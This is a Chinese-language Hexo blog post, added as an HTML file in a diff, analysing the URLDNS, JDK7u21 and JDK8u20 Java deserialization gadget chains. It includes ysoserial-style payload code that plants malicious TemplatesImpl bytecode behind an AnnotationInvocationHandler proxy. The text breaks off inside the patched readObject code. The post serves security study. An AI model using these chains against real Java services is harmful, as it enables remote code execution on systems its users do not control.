@@ -1,0 +1,368 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  
+  <title>C:\Users\root\Downloads\小刘笔记\Blog\source\_posts\原生JDK反序列化 | Hexo</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <meta name="description" content="C:\Users\root\Downloads\小刘笔记\Blog\source\_posts\原生JDK反序列化相关安全研究与分析">
+<meta property="og:type" content="article">
+<meta property="og:title" content="C:\Users\root\Downloads\小刘笔记\Blog\source\_posts\原生JDK反序列化">
+<meta property="og:url" content="http://example.com/2025/01/07/%E5%8E%9F%E7%94%9FJDK%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="C:\Users\root\Downloads\小刘笔记\Blog\source\_posts\原生JDK反序列化相关安全研究与分析">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2024/png/683328/1732195054112-a5a11a68-58f9-4c18-91d5-f6dc4088465e.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2024/png/683328/1732084198952-6b4ba71d-ab7b-4f8c-93c9-d98ad3a1a297.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2024/png/683328/1732171678233-d2d0815c-f0a9-433c-82c4-cc353562f553.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2024/png/683328/1732160811370-1e305815-e1d0-4edc-a505-ed2820a81b4f.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2024/png/683328/1732156796292-7b0e8977-4b53-4809-a55c-63c3560cd6d4.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2024/png/683328/1732161301876-d9c2ec67-0f71-432a-aff4-d82551746028.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2024/png/683328/1732172187494-73f8b14d-7060-4980-bd68-64421cf94bee.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2024/png/683328/1732175590753-de5cdde4-9a02-4e39-8aef-85a8dbffe459.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2024/png/683328/1732175616505-83ebee8b-3976-4bf1-a586-48ee65661e3c.png">
+<meta property="article:published_time" content="2025-01-07T06:36:26.000Z">
+<meta property="article:modified_time" content="2025-01-07T06:36:26.895Z">
+<meta property="article:author" content="John Doe">
+<meta property="article:tag" content="Java安全">
+<meta property="article:tag" content="漏洞分析">
+<meta property="article:tag" content="反序列化">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://cdn.nlark.com/yuque/0/2024/png/683328/1732195054112-a5a11a68-58f9-4c18-91d5-f6dc4088465e.png">
+  
+    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
+  
+  
+    <link rel="shortcut icon" href="/favicon.png">
+  
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+    
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">
+
+  
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">Hexo</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"><span class="fa fa-bars"></span></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+        
+          <a class="nav-icon" href="/atom.xml" title="RSS Feed"><span class="fa fa-rss"></span></a>
+        
+        <a class="nav-icon nav-search-btn" title="Search"><span class="fa fa-search"></span></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
+      </div>
+    </div>
+  </div>
+</header>
+
+      <div class="outer">
+        <section id="main"><article id="post-原生JDK反序列化" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2025/01/07/%E5%8E%9F%E7%94%9FJDK%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" class="article-date">
+  <time class="dt-published" datetime="2025-01-07T06:36:26.000Z" itemprop="datePublished">2025-01-07</time>
+</a>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/">安全研究</a>►<a class="article-category-link" href="/categories/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/Java%E5%AE%89%E5%85%A8/">Java安全</a>►<a class="article-category-link" href="/categories/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/Java%E5%AE%89%E5%85%A8/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/">反序列化漏洞</a>
+  </div>
+
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="p-name article-title" itemprop="headline name">
+      C:\Users\root\Downloads\小刘笔记\Blog\source\_posts\原生JDK反序列化
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h2 id="URLDNS"><a href="#URLDNS" class="headerlink" title="URLDNS"></a>URLDNS</h2><p>HashMap+URL</p>
+<p>URLDNS就是ysoserial中一个利用链的名字，但准确来说，这个其实不能称作“利用链”。因为其参数不是一个可以“利用”的命令，而仅为一个URL，其能触发的结果也不是命令执行，而是一次DNS请求。</p>
+<p>虽然这个“利用链”实际上是不能“利用”的，但因为其如下的优点，非常适合在检测反序列化漏洞时使用：</p>
+<ul>
+<li>使用Java内置的类构造，对第三方库没有依赖</li>
+<li>在目标没有回显的时候，能够通过DNS请求得知是否存在反序列化漏洞</li>
+<li>将 value 值插入为 Class 对象实现类探测</li>
+</ul>
+<h3 id="版本问题："><a href="#版本问题：" class="headerlink" title="版本问题："></a>版本问题：</h3><p>受模块化影响，JDK16之后不可用。</p>
+<p>Java 9 引入的模块化系统，限制了对某些包的访问。</p>
+<p>在这里就是，java.base 模块没有将 java.net 包开放给未命名的模块，导致无法访问 java.net.URL.hashCode 字段。</p>
+<p>在 JDK 9 到 JDK 15 之间，Java 模块系统（JPMS）已经存在，但 Java 允许通过反射访问未公开的模块，只会发出警告。</p>
+<p>从 JDK 16 开始，Java 加强了模块的封装性，默认情况下禁止反射访问未公开的模块，必须通过 –add-opens 参数显式开启访问权限。</p>
+<h3 id="整个URLDNS的Gadget："><a href="#整个URLDNS的Gadget：" class="headerlink" title="整个URLDNS的Gadget："></a>整个URLDNS的Gadget：</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Gadget Chain:</span><br><span class="line">  HashMap.readObject()</span><br><span class="line">    HashMap.putVal()</span><br><span class="line">        HashMap.hash()</span><br><span class="line">         URL.hashCode()</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<p>HashMap类的readObject方法，在putVal之前，将HashMap的键名计算了hash，hash方法调用了key的hashCode()方法。</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2024/png/683328/1732195054112-a5a11a68-58f9-4c18-91d5-f6dc4088465e.png"></p>
+<p>URLDNS中使用的这个key是一个java.net.URL对象，其hashCode方法有调用URLStreamHandler的getHostAddress方法。URLStreamHandler的getHostAddress方法中调用了InetAddress.getByName(host)。</p>
+<p>InetAddress.getByName(host)的作用是根据主机名，获取其IP地址，在网络上其实就是一次DNS查询。</p>
+<p>用一些第三方的反连平台就可以查看到这次请求。</p>
+<p>注意点：</p>
+<p>（1）设置URL对象的hashCode为初始值-1，这样反序列化时将会重新计算其hashCode，才能触发到后面的DNS请求，否则不会调用URL-&gt;hashCode()。</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2024/png/683328/1732084198952-6b4ba71d-ab7b-4f8c-93c9-d98ad3a1a297.png"></p>
+<p>（2）ysoserial为了防止在生成Payload的时候也执行了URL请求和DNS查询，所以重写了一个SilentURLStreamHandler类，这不是必须的。</p>
+<h3 id="ysoserial-payload"><a href="#ysoserial-payload" class="headerlink" title="ysoserial payload"></a>ysoserial payload</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">URLStreamHandler</span> <span class="variable">handler</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SilentURLStreamHandler</span>();</span><br><span class="line"></span><br><span class="line"><span class="type">HashMap</span> <span class="variable">ht</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>(); </span><br><span class="line"><span class="type">URL</span> <span class="variable">u</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="literal">null</span>, url, handler); <span class="comment">// URL用作 Key</span></span><br><span class="line">ht.put(u, url); <span class="comment">//value可以是任何可序列化的值，URL作为key是触发DNS查找的原因。</span></span><br><span class="line"></span><br><span class="line">Reflections.setFieldValue(u, <span class="string">&quot;hashCode&quot;</span>, -<span class="number">1</span>); <span class="comment">// 重置hashcode，以便下次调用hashCode时将触发DNS查找。</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> ht;</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="类探测"><a href="#类探测" class="headerlink" title="类探测"></a>类探测</h3><p>在调用 HashMap 的 putVal() 前调用了这两个方法，而在 readObject() 中，当类不存在时会抛出 ClassNotFoundException 异常，也就不会触发到后续的请求，因此可以将 value 值插入为 Class 对象实现类探测。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">K</span> <span class="variable">key</span> <span class="operator">=</span> (K) s.readObject();</span><br><span class="line"><span class="type">V</span> <span class="variable">value</span> <span class="operator">=</span> (V) s.readObject();</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="JDK7u21"><a href="#JDK7u21" class="headerlink" title="JDK7u21"></a>JDK7u21</h2><p>HashSet+proxy+AnnotationInvocationHandler+TemplateImpl</p>
+<h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><h4 id="（1）AnnotationInvocationHandler类中的equalsImpl方法"><a href="#（1）AnnotationInvocationHandler类中的equalsImpl方法" class="headerlink" title="（1）AnnotationInvocationHandler类中的equalsImpl方法"></a>（1）AnnotationInvocationHandler类中的equalsImpl方法</h4><p>equalsImpl这个方法是将this.type类中的所有方法遍历并执行了，参数也要是this.type类型。那么，假设this.type是Templates接口，则势必会调用到其中的newTransformer()或getOutputProperties()方法，进而触发任意代码执行。</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2024/png/683328/1732171678233-d2d0815c-f0a9-433c-82c4-cc353562f553.png"></p>
+<p><img src="https://cdn.nlark.com/yuque/0/2024/png/683328/1732160811370-1e305815-e1d0-4edc-a505-ed2820a81b4f.png"></p>
+<h4 id="（2）如何调用equalsImpl"><a href="#（2）如何调用equalsImpl" class="headerlink" title="（2）如何调用equalsImpl"></a>（2）如何调用equalsImpl</h4><p>equalsImpl是一个私有方法，在AnnotationInvocationHandler#invoke中被调用。</p>
+<p>当方法名等于“equals”，且仅有一个Object类型参数时，会调用到equalImpl方法。</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2024/png/683328/1732156796292-7b0e8977-4b53-4809-a55c-63c3560cd6d4.png"></p>
+<h4 id="（3）equals方法调用链"><a href="#（3）equals方法调用链" class="headerlink" title="（3）equals方法调用链&lt;–HashSet"></a>（3）equals方法调用链&lt;–HashSet</h4><p>另一个常见的会调用equals的场景就是集合set。set中储存的对象不允许重复，所以在添加对象的时候，势必会涉及到比较操作。</p>
+<p>查看HashSet的readObject方法，使用了一个HashMap，将对象保存在HashMap的key处来做去重。</p>
+<p>HashMap，就是数据结构里的哈希表，哈希表是由数组+链表实现的——哈希表底层保存在一个数组中，数组的索引由哈希表的key.hashCode()经过计算得到，数组的值是一个链表，所有哈希碰撞到相同索引的key-value，都会被链接到这个链表后面。</p>
+<p>所以，为了触发比较操作，我们需要让比较与被比较的两个对象的哈希相同，这样才能被连接到同一条链表上，才会进行比较。</p>
+<p>HashMap的put方法如下，对第二个对象调用equals方法。</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2024/png/683328/1732161301876-d9c2ec67-0f71-432a-aff4-d82551746028.png"></p>
+<h4 id="（4）HashSet两个对象hash值要一样。"><a href="#（4）HashSet两个对象hash值要一样。" class="headerlink" title="（4）HashSet两个对象hash值要一样。"></a>（4）HashSet两个对象hash值要一样。</h4><p>在上面的HashMap的put方法中调用<code>key.equals(k)</code>，因为key 是后传入进来比较的，所以在构造 Hashset 时应该先添加 TemplatesImpl 后添加 Proxy。</p>
+<p>往HashSet放两个对象，第一个对象是TemplatesImpl，第二个对象是AnnotationInvocationHandler代理的Templates接口的proxy对象Proxy(TemplatesImpl)，这样当它比较时才会触发equals–&gt;equalsImpl–&gt;TemplatesImpl#newTransformer()。</p>
+<p>只要让AnnotationInvocationHandler的map中的key的值是hash值为0的字符串,value值是同样的TemplatesImpl，就可以满足这两个对象hash一致，触发AnnotationInvocationHandler的equals。</p>
+<h4 id="（5）让proxy对象的“哈希”，等于TemplateImpl对象的“哈希”"><a href="#（5）让proxy对象的“哈希”，等于TemplateImpl对象的“哈希”" class="headerlink" title="（5）让proxy对象的“哈希”，等于TemplateImpl对象的“哈希”"></a>（5）让proxy对象的“哈希”，等于TemplateImpl对象的“哈希”</h4><p>proxy.hashCode()仍然会调用到AnnotationInvocationHandler#invoke，进而调用到</p>
+<p>AnnotationInvocationHandler#hashCodeImpl。遍历memberValues这个Map中的每个key和value，计算每个(127 * key.hashCode()) ^ value.hashCode()并求和。</p>
+<p>JDK7u21中使用了一个非常巧妙的方法：</p>
+<p>当memberValues中只有一个key和一个value时，该哈希简化成(127 * key.hashCode()) ^ value.hashCode()</p>
+<p>当key.hashCode()等于0时，任何数异或0的结果仍是他本身，所以该哈希简化成value.hashCode()。</p>
+<p>当value就是TemplateImpl对象时，这两个哈希就变成完全相等。</p>
+<p>所以，我们找到一个hashCode是0的对象作为memberValues的key，将恶意TemplateImpl对象作为</p>
+<p>value，这个proxy计算的hashCode就与TemplateImpl对象本身的hashCode相等了。</p>
+<p>找一个hashCode是0的对象，我们可以写一个简单的爆破程序来实现。</p>
+<p>跑出来第一个是f5a5a608，这个也是ysoserial中用到的字符串。</p>
+<h3 id="Gadget"><a href="#Gadget" class="headerlink" title="Gadget"></a>Gadget</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">HashSet.readObject()</span><br><span class="line">HashMap.put()</span><br><span class="line">  Proxy(Templates).equals(Templates) <span class="comment">// 精心构造使得2个对象的hashCode相同，触发equals</span></span><br><span class="line">  AnnotationInvocationHandler.invoke()</span><br><span class="line">  AnnotationInvocationHandler.equalsImpl(Templates) <span class="comment">// 触发memberMethod.invoke(o)</span></span><br><span class="line">    Templates.newTransformer() === TemplatesImpl.newTransformer()  <span class="comment">// equalsImpl中会反射调用AnnotationInvocationHandler实例中type属性对应类的所有方法，由于AnnotationInvocationHandler的type是Templates，则会去调用Templates中的newTransformer</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="Payload"><a href="#Payload" class="headerlink" title="Payload"></a>Payload</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">setFieldValue(templates, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;</span><br><span class="line">        ClassPool.getDefault().get(evil.EvilTemplatesImpl.class.getName()).toBytecode()</span><br><span class="line">&#125;);</span><br><span class="line">setFieldValue(templates, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;HelloTemplatesImpl&quot;</span>);</span><br><span class="line">setFieldValue(templates, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line"><span class="type">String</span> <span class="variable">zeroHashCodeStr</span> <span class="operator">=</span> <span class="string">&quot;f5a5a608&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 实例化一个map，并添加Magic Number为key，也就是f5a5a608，value先随便设置一个值</span></span><br><span class="line"><span class="type">HashMap</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">map.put(zeroHashCodeStr, <span class="string">&quot;foo&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 实例化AnnotationInvocationHandler类</span></span><br><span class="line"><span class="type">Constructor</span> <span class="variable">handlerConstructor</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>).getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">handlerConstructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">InvocationHandler</span> <span class="variable">tempHandler</span> <span class="operator">=</span> (InvocationHandler) handlerConstructor.newInstance(Templates.class, map);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 为tempHandler创造一层代理</span></span><br><span class="line"><span class="type">Templates</span> <span class="variable">proxy</span> <span class="operator">=</span> (Templates) Proxy.newProxyInstance(JDK7u21.class.getClassLoader(), <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Templates.class&#125;, tempHandler);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 实例化HashSet，并将两个对象放进去</span></span><br><span class="line"><span class="type">HashSet</span> <span class="variable">set</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">LinkedHashSet</span>();</span><br><span class="line">set.add(templates);</span><br><span class="line">set.add(proxy);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 将恶意templates设置到map中</span></span><br><span class="line">map.put(zeroHashCodeStr, templates);</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="JDK8u20"><a href="#JDK8u20" class="headerlink" title="JDK8u20"></a>JDK8u20</h2><h3 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h3><h4 id="（1）JDK7u21的修复"><a href="#（1）JDK7u21的修复" class="headerlink" title="（1）JDK7u21的修复"></a>（1）JDK7u21的修复</h4><p>在sun.reflect.annotation.AnnotationInvocationHandler类的readObject函数中，原本有一个对this.type的检查，在其不是AnnotationType的情况下，会抛出一个异常。但是，捕获到异常后没有做任何事情，只是将这个函数返回了，这样并不影响整个反序列化的执行过程。</p>
+<p>新版中，将return;修改成throw new java.io.InvalidObjectException(“Non-annotation type in annotation serial stream”);，这样，反序列化时会出现一个异常，导致整个过程停止。</p>
+<p>JDK8u20就是对这个异常抛出的绕过。</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2024/png/683328/1732172187494-73f8b14d-7060-4980-bd68-64421cf94bee.png"></p>
+<h4 id="（2）Try-Catch"><a href="#（2）Try-Catch" class="headerlink" title="（2）Try-Catch"></a>（2）Try-Catch</h4><p>在一个存在try … catch块的方法（无异常抛出）中去调用另一个存在try … catch块的方法（有异常抛出），如果被调用的方法（有异常抛出）出错，那么会导致调用方法出错且不会继续执行完调用方法的代码逻辑，但是不会终止代码运行的进程</p>
+<h4 id="（3）TC-REFERENCE"><a href="#（3）TC-REFERENCE" class="headerlink" title="（3）TC_REFERENCE"></a>（3）TC_REFERENCE</h4><p>TC_REFERENCE是对已经反序列化过的对象的引用。</p>
+<p>在 Java 序列化流中，TC_REFERENCE 的结构通常如下：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">TC_REFERENCE (<span class="type">byte</span>)  <span class="comment">// 固定值 0x71</span></span><br><span class="line">handle (<span class="type">int</span>)         <span class="comment">// 指向已反序列化对象的引用句柄</span></span><br></pre></td></tr></table></figure>
+
+<p>反序列化流程还原到TC_REFERENCE的时候，会尝试还原引用的handle对象。</p>
+<h4 id="（4）成员抛弃"><a href="#（4）成员抛弃" class="headerlink" title="（4）成员抛弃"></a>（4）成员抛弃</h4><p>如果序列化的数据中包含某些字段，而在目标类中没有定义对应的属性，那么这些字段在反序列化时就会被抛弃。</p>
+<p>不过不存在的字段也会被反序列化，而且如果这个值是一个对象的话，那么会为这个值分配一个 Handle。</p>
+<h4 id="（5）重写-writeObject-方法"><a href="#（5）重写-writeObject-方法" class="headerlink" title="（5）重写 writeObject 方法"></a>（5）重写 writeObject 方法</h4><p>重写 writeObject() 看会发生什么</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">writeObject</span><span class="params">(ObjectOutputStream output)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    output.defaultWriteObject();</span><br><span class="line">    output.writeObject(<span class="string">&quot;this is object write&quot;</span>);</span><br><span class="line">    output.writeUTF(<span class="string">&quot;this is utf data&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>两次代码的变化主要体现在：</p>
+<p>@ClassDescFlags 中增加了一个 SC_WRITE_METHOD 标识</p>
+<p>增加 @ObjectAnnotation 写入自定义的数据</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@ClassDescFlags</span> - SC_SERIALIZABLE|SC_WRITE_METHOD - <span class="number">0x03</span></span><br><span class="line"><span class="meta">@ObjectAnnotation</span></span><br><span class="line">  TC_STRING - <span class="number">0x74</span></span><br><span class="line">    <span class="meta">@Handler</span> - <span class="number">8257544</span></span><br><span class="line">    <span class="meta">@Length</span> - <span class="number">20</span> - <span class="number">0x00</span> <span class="number">14</span></span><br><span class="line">    <span class="meta">@Value</span> - <span class="built_in">this</span> is object write - <span class="number">0x74</span> <span class="number">68</span> <span class="number">69</span> <span class="number">73</span> <span class="number">20</span> <span class="number">69</span> <span class="number">73</span> <span class="number">20</span> <span class="number">6f</span> <span class="number">62</span> 6a <span class="number">65</span> <span class="number">63</span> <span class="number">74</span> <span class="number">20</span> <span class="number">77</span> <span class="number">72</span> <span class="number">69</span> <span class="number">74</span> <span class="number">65</span></span><br><span class="line">  TC_BLOCKDATA - <span class="number">0x77</span></span><br><span class="line">    <span class="meta">@Blockdata</span> - <span class="number">0x00</span> <span class="number">10</span> <span class="number">74</span> <span class="number">68</span> <span class="number">69</span> <span class="number">73</span> <span class="number">20</span> <span class="number">69</span> <span class="number">73</span> <span class="number">20</span> <span class="number">75</span> <span class="number">74</span> <span class="number">66</span> <span class="number">20</span> <span class="number">64</span> <span class="number">61</span> <span class="number">74</span> <span class="number">61</span></span><br><span class="line">  TC_ENDBLOCKDATA - <span class="number">0x78</span></span><br></pre></td></tr></table></figure>
+
+<p>那么我们根据 Java 序列化数据的语法实现 writeObject() 方法的篡改，增加我们想要的数据。</p>
+<h4 id="（6）BeanContextSupport"><a href="#（6）BeanContextSupport" class="headerlink" title="（6）BeanContextSupport"></a>（6）BeanContextSupport</h4><p>BeanContextSupport的readChildren方法对传入进来的ObjectInputStream对象调用了readObject方法进行反序列化处理，并且当在反序列化过程中如果出现异常，采用的是continue处理。</p>
+<p>通过在JDK7u21的proxy对象（LinkedHashSet的第二个数据）中插入一个假的成员——BeanContextSupport的对象，在反序列化的时候这个数据会被抛弃掉，因为实际上类的定义中并没有这么一个成员，但是该对象依然会被反序列化并且为其分配handle，那么在BeanContextSupport的反序列化过程中，就可以利用前面提到的try…catch…结构顺利的还原出AnnotationInvocationHandler对象，并且通过构造序列化数据完成整个序列化流程。</p>
+<p>BeanContextSupport类的对象，构造了serializable的值为1，执行readObject所以会继续执行readChildren(ois)方法，在这个方法中会继续从stream中读取一个object。</p>
+<p>BeanContextSupport下一个对象就是AnnotationInvocationHandler，之后继续反序列化AnnotationInvocationHandler对象。反序列化AnnotationInvocationHandler对象时会遇到异常，但是这个异常被外层的BeanContextSupport的readChildren捕获了没有抛出，反序列化流程没有被打断。</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2024/png/683328/1732175590753-de5cdde4-9a02-4e39-8aef-85a8dbffe459.png"></p>
+<p><img src="https://cdn.nlark.com/yuque/0/2024/png/683328/1732175616505-83ebee8b-3976-4bf1-a586-48ee65661e3c.png"></p>
+<p>接下来就是和jdk7u21一样回到HashSet的readObject方法中，触发AnnotationInvocationHandler的equalsImpl执行代码。</p>
+<h3 id="修复："><a href="#修复：" class="headerlink" title="修复："></a>修复：</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(ObjectInputStream var1)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">    <span class="type">GetField</span> <span class="variable">var2</span> <span class="operator">=</span> var1.readFields(); <span class="comment">//这里直接没有defaultReadObject了</span></span><br><span class="line">    <span class="type">Class</span> <span class="variable">var3</span> <span class="operator">=</span> (Class)var2.get(<span class="string">&quot;type&quot;</span>, (Object)<span class="literal">null</span>); <span class="comment">//先把type和memberValues取出来赋值给变量，经过检查后才赋值</span></span><br><span class="line">    <span class="type">Map</span> <span class="variable">var4</span> <span class="operator">=</span> (Map)var2.get(<span class="string">&quot;memberValues&quot;</span>, (Object)<span class="literal">null</span>);</span><br><span class="line">    <span class="type">AnnotationType</span> <span class="variable">var5</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        var5 = AnnotationType.getInstance(var3); <span class="comment">//走这个流程后出来的AnnotationInvocationHandler的所有成员变量都是null</span></span><br><span class="line">    &#125; <span class="keyword">catch</span> (IllegalArgumentException var13) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">InvalidObjectException</span>(<span class="string">&quot;Non-annotation type in annotation serial stream&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">Map</span> <span class="variable">var6</span> <span class="operator">=</span> var5.memberTypes();</span><br><span class="line">    <span class="type">LinkedHashMap</span> <span class="variable">var7</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">LinkedHashMap</span>();</span><br><span class="line"></span><br><span class="line">    String var10;</span><br><span class="line">    Object var11;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">Iterator</span> <span class="variable">var8</span> <span class="operator">=</span> var4.entrySet().iterator(); var8.hasNext(); var7.put(var10, var11)) &#123;</span><br><span class="line">        <span class="type">Entry</span> <span class="variable">var9</span> <span class="operator">=</span> (Entry)var8.next();</span><br><span class="line">        var10 = (String)var9.getKey();</span><br><span class="line">        var11 = <span class="literal">null</span>;</span><br><span class="line">        <span class="type">Class</span> <span class="variable">var12</span> <span class="operator">=</span> (Class)var6.get(var10);</span><br><span class="line">        <span class="keyword">if</span> (var12 != <span class="literal">null</span>) &#123;</span><br><span class="line">            var11 = var9.getValue();</span><br><span class="line">            <span class="keyword">if</span> (!var12.isInstance(var11) &amp;&amp; !(var11 <span class="keyword">instanceof</span> 